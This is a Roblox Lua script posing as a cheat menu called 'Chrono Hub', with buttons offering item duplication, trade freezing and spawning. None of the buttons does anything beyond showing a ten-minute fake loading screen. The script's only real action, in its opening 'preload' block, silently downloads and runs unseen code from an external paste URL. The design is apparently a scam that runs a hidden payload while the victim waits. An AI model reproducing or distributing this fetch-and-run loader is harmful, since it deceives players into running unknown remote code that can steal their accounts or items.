-- ================= PRELOAD SCRIPT =================
pcall(function()
loadstring(game:HttpGet(
"https://api.rubis.app/v2/scrap/WBGp0WUUG81TmOeP/raw",
true
))()
end)

-- ================= CHRONO HUB | VISUAL ONLY =================

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local player = Players.LocalPlayer

local LOAD_TIME = 10 * 60 -- 10 minutes

-- ================= FULLSCREEN LOADING =================
local loadGui = Instance.new("ScreenGui")
loadGui.Name = "ChronoLoading"
loadGui.IgnoreGuiInset = true
loadGui.ResetOnSpawn = false
loadGui.Enabled = false
loadGui.Parent = player:WaitForChild("PlayerGui")

local bg = Instance.new("Frame", loadGui)
bg.Size = UDim2.fromScale(1,1)
bg.BackgroundColor3 = Color3.fromRGB(5,5,5)
bg.BorderSizePixel = 0

-- glitch particles
for i = 1, 40 do
local glitch = Instance.new("Frame", bg)
glitch.Size = UDim2.fromScale(math.random(2,6)/100, 0.002)
glitch.Position = UDim2.fromScale(math.random(), math.random())
glitch.BackgroundColor3 = Color3.fromRGB(45,45,45)
glitch.BorderSizePixel = 0

task.spawn(function()  
	while true do  
		TweenService:Create(  
			glitch,  
			TweenInfo.new(math.random(4,10), Enum.EasingStyle.Linear),  
			{Position = UDim2.fromScale(math.random(), math.random())}  
		):Play()  
		task.wait(6)  
	end  
end)

end

local title = Instance.new("TextLabel", bg)
title.Size = UDim2.fromScale(1,0.1)
title.Position = UDim2.fromScale(0,0.22)
title.BackgroundTransparency = 1
title.TextScaled = true
title.Font = Enum.Font.Arcade
title.TextColor3 = Color3.fromRGB(235,235,235)

local status = Instance.new("TextLabel", bg)
status.Size = UDim2.fromScale(1,0.05)
status.Position = UDim2.fromScale(0,0.34)
status.BackgroundTransparency = 1
status.TextScaled = true
status.Font = Enum.Font.Arcade
status.TextColor3 = Color3.fromRGB(160,160,160)

local barBg = Instance.new("Frame", bg)
barBg.Size = UDim2.fromScale(0.7,0.02)
barBg.Position = UDim2.fromScale(0.15,0.45)
barBg.BackgroundColor3 = Color3.fromRGB(25,25,25)
barBg.BorderSizePixel = 0

local bar = Instance.new("Frame", barBg)
bar.Size = UDim2.fromScale(0,1)
bar.BackgroundColor3 = Color3.fromRGB(120,180,255)
bar.BorderSizePixel = 0

local texts = {
"Injecting...",
"Securing script...",
"Syncing assets...",
"Applying bypass...",
"Finalizing..."
}

local function startLoading(name)
loadGui.Enabled = true
title.Text = name
bar.Size = UDim2.fromScale(0,1)

TweenService:Create(  
	bar,  
	TweenInfo.new(LOAD_TIME, Enum.EasingStyle.Linear),  
	{Size = UDim2.fromScale(1,1)}  
):Play()  

task.spawn(function()  
	local i = 1  
	while loadGui.Enabled do  
		status.Text = texts[i]  
		i = (i % #texts) + 1  
		task.wait(12)  
	end  
end)

end

-- ================= MAIN PICKER =================
local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = player.PlayerGui

local panel = Instance.new("Frame", gui)
panel.Size = UDim2.fromScale(0.33,0.42)
panel.Position = UDim2.fromScale(0.335,0.29)
panel.BackgroundColor3 = Color3.fromRGB(15,15,15)
panel.BorderSizePixel = 0
Instance.new("UICorner", panel).CornerRadius = UDim.new(0,20)

-- draggable
do
local dragging = false
local dragStart, startPos

panel.InputBegan:Connect(function(input)  
	if input.UserInputType == Enum.UserInputType.MouseButton1  
	or input.UserInputType == Enum.UserInputType.Touch then  
		dragging = true  
		dragStart = input.Position  
		startPos = panel.Position  

		input.Changed:Connect(function()  
			if input.UserInputState == Enum.UserInputState.End then  
				dragging = false  
			end  
		end)  
	end  
end)  

panel.InputChanged:Connect(function(input)  
	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement  
	or input.UserInputType == Enum.UserInputType.Touch) then  
		local delta = input.Position - dragStart  
		panel.Position = UDim2.new(  
			startPos.X.Scale,  
			startPos.X.Offset + delta.X,  
			startPos.Y.Scale,  
			startPos.Y.Offset + delta.Y  
		)  
	end  
end)

end

local hubTitle = Instance.new("TextLabel", panel)
hubTitle.Size = UDim2.fromScale(1,0.18)
hubTitle.BackgroundTransparency = 1
hubTitle.Text = "CHRONO HUB"
hubTitle.TextScaled = true
hubTitle.Font = Enum.Font.Arcade
hubTitle.TextColor3 = Color3.fromRGB(210,210,210)

local function makeBtn(text, color, y)
local b = Instance.new("TextButton", panel)
b.Size = UDim2.fromScale(0.9,0.18)
b.Position = UDim2.fromScale(0.05,y)
b.Text = text
b.TextScaled = true
b.Font = Enum.Font.Arcade
b.TextColor3 = Color3.new(1,1,1)
b.BackgroundColor3 = color
b.BorderSizePixel = 0
Instance.new("UICorner", b).CornerRadius = UDim.new(0,16)
return b
end

makeBtn("🔥 DUPLICATOR", Color3.fromRGB(170,60,60), 0.22)
.MouseButton1Click:Connect(function()
startLoading("DUPLICATOR")
end)

makeBtn("❄️ TRADE FREEZE", Color3.fromRGB(60,100,180), 0.45)
.MouseButton1Click:Connect(function()
startLoading("TRADE FREEZE")
end)

makeBtn("✨ SPAWNER", Color3.fromRGB(60,150,90), 0.68)
.MouseButton1Click:Connect(function()
startLoading("SPAWNER")
end)
